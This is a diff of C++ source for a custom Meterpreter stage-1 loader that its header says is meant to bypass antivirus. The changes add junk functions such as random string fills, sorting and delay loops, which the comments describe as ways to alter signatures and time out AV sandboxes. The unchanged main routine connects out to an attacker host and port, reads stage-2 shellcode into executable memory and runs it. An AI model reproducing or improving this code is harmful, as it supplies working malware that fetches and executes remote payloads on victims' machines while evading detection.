@@ -1,6 +1,5 @@
 // Meterp-stage1.cpp :custom meterpreter stage 1 source code bypass AV.
 // Author: Nathaniel Hirsch <nathaniel.hirsch@gmail.com>
-//
 
 #include "stdafx.h"
 
@@ -16,6 +15,21 @@ char* make_string1(char* s)
 	} 
 	result[i] = '\0'; 
 	return result; 
+}
+
+//pow mod function  result = a ^ b mode c
+long powmod(long a, long b, long c){
+	long result = 1;
+	long base = a;
+
+	while (b){
+		if (b & 1){
+			result = result*base % c;
+		}
+		b >>= 1;
+		base = base*base % c;
+	}
+	return result;
 }
 
 //garbage string creation function to fool av reverse string
@@ -45,6 +59,7 @@ char* make_string3(char *s)
 	result[i] = '\0';
 	return result;
 }
+
 //set up the socket
 void startsock() 
 { 
@@ -60,7 +75,6 @@ void startsock()
 //garbage function to spin out time
 void killit(int maxnum)
 {
-	int i;
 	int randnum = maxnum + 500;
 
 	while (randnum > maxnum)
@@ -88,19 +102,19 @@ void sockerror(SOCKET sock)
 //garbage string creation function to fool av
 char* scratch_fill2()
 { 
-	char scratch[200];
+	char scratch1[200];
 	char scratch2[100]; 
 	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 	for (int i = 0; i < 100; ++i)
 	{
-		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+		scratch1[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 		scratch2[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 	}
 
-	scratch[99] = '\0';
+	scratch1[99] = '\0';
 	scratch2[99] = '\0';
 	
-	return make_string2(strcat(scratch, scratch2));
+	return make_string2(strcat(scratch1, scratch2));
 }
 
 //get the stage 2 shellcode
@@ -150,7 +164,82 @@ char* scratch_fill4()
 	scratch[99] = '\0';
 	scratch2 = make_string3(scratch);
 	scratch2[99] = '\0';
+	return scratch2;
+}
+
+//garbage string creation function to fool av
+char* scratch_fill5()
+{
+	static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+	char scratch[100];
+	for (int i = 0; i < 100; ++i)
+	{
+		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	scratch[99] = '\0';
 	return scratch;
+}
+
+//for quick sort
+int partition(int a[], int l, int r) {
+	int pivot, i, j, t;
+	pivot = a[l];
+	i = l; j = r + 1;
+
+	while (1)
+	{
+		do ++i; while (a[i] <= pivot && i <= r);
+		do --j; while (a[j] > pivot);
+		if (i >= j) break;
+		t = a[i]; a[i] = a[j]; a[j] = t;
+	}
+	t = a[l]; a[l] = a[j]; a[j] = t;
+	return j;
+}
+
+//quick sort
+void quickSort(int a[], int l, int r)
+{
+	int j;
+
+	if (l < r)
+	{
+		// divide and conquer
+		j = partition(a, l, r);
+		quickSort(a, l, j - 1);
+		quickSort(a, j + 1, r);
+	}
+
+}
+
+//garbage int generation function
+void rand_num()
+{
+	int num[SCRATCH_SIZE];
+	int i;
+
+	for (i = 0; i < SCRATCH_SIZE; ++i)
+	{
+		num[i] = rand() % MAXINT32;
+	}
+	quickSort(num, 0, SCRATCH_SIZE);
+}
+
+//garbage random function.
+void rand_fun()
+{
+	static const char alphanum[] = "0123456789";
+	char scratch[10];
+	int num;
+	int i;
+	for (i = 0; i < 10; ++i)
+	{
+		scratch[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	scratch[i] = '\0';
+	num = atoi(scratch);
 }
 
 //make the connection to addr on port
@@ -177,48 +266,116 @@ SOCKET connect(char * addr, int port)
 }
 
 /* These are used for AV evasion, eating up AV sanbox time, modifying signature, etc*/
-void call_func(int run)   
+void rand_func()   
 {
-	int i;
+	int i,j;
+	int run = rand() % 10 + 1;
+
 	char * scratch[SCRATCH_SIZE];
+	char temp[6000];
 
 	for (i = 0; i < SCRATCH_SIZE; ++i)
-		scratch[i] = (char *)malloc(rand() % 5000 + 1000);
+		scratch[i] = (char *)malloc(rand() % 5000 + 1000 + _getpid() );
 
 	switch (run)
 	{
-	case 1:
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			strcpy(scratch[i], scratch_fill1());
+		case 1:
+			for (i = 0; i < SCRATCH_SIZE; ++i)
+				strcpy(scratch[i], scratch_fill1());
 		
-		break;
+			for (i = 0; i<SCRATCH_SIZE; ++i)
+				for (j = i + 1; j<SCRATCH_SIZE; ++j){
+					if (strcmp(scratch[i], scratch[j])<0)
+					{
+						strcpy(temp, scratch[i]);
+						strcpy(scratch[i], scratch[j]);
+						strcpy(scratch[j], temp);
+					}
+				}
+			break;
 
-	case 2:
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			strcpy(scratch[i], scratch_fill2());
+		case 2:
+			for (i = 0; i < SCRATCH_SIZE; ++i)
+				strcpy(scratch[i], scratch_fill2());
 		
-		break;
+			for (i = 0; i<SCRATCH_SIZE; ++i)
+				for (j = i + 1; j<SCRATCH_SIZE; ++j){
+					if (strcmp(scratch[i], scratch[j])>0)
+					{
+						strcpy(temp, scratch[i]);
+						strcpy(scratch[i], scratch[j]);
+						strcpy(scratch[j], temp);
+					}
+				}
+			break;
 
-	case 3:
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			strcpy(scratch[i], scratch_fill3());
+		case 3:
+			for (i = 0; i < SCRATCH_SIZE; ++i)
+				strcpy(scratch[i], scratch_fill3());
 
-		break;
+			for (i = 0; i<SCRATCH_SIZE; ++i)
+				for (j = i + 1; j<SCRATCH_SIZE; ++j){
+					if (strcmp(scratch[i], scratch[j])<0)
+					{
+						strcpy(temp, scratch[i]);
+						strcpy(scratch[i], scratch[j]);
+						strcpy(scratch[j], temp);
+					}
+				}
+			break;
 
-	case 4:
-		killit(rand() % 5000);
-		break;
+		case 4:
+			for (i = 0; i < SCRATCH_SIZE; ++i)
+				strcpy(scratch[i], scratch_fill4());
 
-	case 5:
-		for (i = 0; i < SCRATCH_SIZE; ++i)
-			strcpy(scratch[i], scratch_fill4());
+			for (i = 0; i<SCRATCH_SIZE; ++i)
+				for (j = i + 1; j<SCRATCH_SIZE; ++j){
+					if (strcmp(scratch[i], scratch[j])>0)
+					{
+						strcpy(temp, scratch[i]);
+						strcpy(scratch[i], scratch[j]);
+						strcpy(scratch[j], temp);
+					}
+				}
+			break;
 
-		break;
+		case 5:	
+			unsigned long a;
+			for (i = 0; i < rand() % 1000 + 100; i++)
+			{
+				a = powmod(rand() % 1000, rand() % 1000, rand() % 1000);
+			}
+			i = 0;
+			for (; a > 0; a--){
+				i = i << 1;
+			}
+			break;
+			
+		case 6:
+			for (i = 0; i < rand() % _getpid(); i++)
+			{
+				__noop;
+			}
+			break;
+			
+		case 7:
+			for (i = 0; i < SCRATCH_SIZE; ++i)
+				strcpy(scratch[i], scratch_fill5());
+			break;
 
-	default:
-		killit(rand() % 5000);
-		break;
+		case 8:
+			rand_num();
+			break;
+
+		case 9:
+			rand_fun();
+			break;
+
+		default:
+			killit(rand() % 5000);
+			break;
 	}
+
 	for (i = 0; i < SCRATCH_SIZE; ++i)
 		free(scratch[i]);
 
@@ -232,39 +389,38 @@ int _tmain(int argc, _TCHAR* argv[])
 	ULONG32 stage0;		//data received to create meterpreter stage 2
 	char * stage1;		//stage 2 shellcode stored here
 	void(*stage2)();	//function pointer to execute stage 2 shellcode
-	int i;
 	
 	srand((unsigned)time(NULL));
 
-killit(rand() % 5000 + 1000);  //run this first to timeout any AV sandbox.
+														killit(rand() % 5000 + 1000);  //run this first to timeout any AV sandbox.
 
 	startsock();
-call_func(rand() % 5 + 1);
+														rand_func();
 	if (argc != 3) {		//either edit stdafx.h to set LHOST:LPORT or call ./prog.exe host port
 		sock = connect(LHOST, LPORT);
 	} 	else {
 		sock = connect((char *)argv[1], atoi((char *) argv[2]));
 	}
-call_func(rand() % 5 + 1);
+														rand_func();
 	int size = recv(sock, (char *)&stage0, 4, 0);
-call_func(rand() % 5 + 1);
+														rand_func();
 	if (size != 4 || stage0 <= 0)
 		sockerror(sock);
-call_func(rand() % 5 + 1);
+														rand_func();
 	stage1 = (char *) VirtualAlloc(0, stage0 + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-call_func(rand() % 5 + 1);
+														rand_func();
 	if (stage1 == NULL)
 		sockerror(sock);
-call_func(rand() % 5 + 1);
+														rand_func();
 	stage1[0] = 0xBF;
-call_func(rand() % 5 + 1);
+														rand_func();
 	memcpy(stage1 + 1, &sock, 4);
-call_func(rand() % 5 + 1);
+														rand_func();
 	size = getit(sock, stage1 + 5, stage0);
-call_func(rand() % 5 + 1);
+														rand_func();
 	stage2 = (void(*)())stage1;
-call_func(rand() % 5 + 1);
+														rand_func();
 	stage2();
-call_func(rand() % 5 + 1);
+														rand_func();
 	return 0;
 }
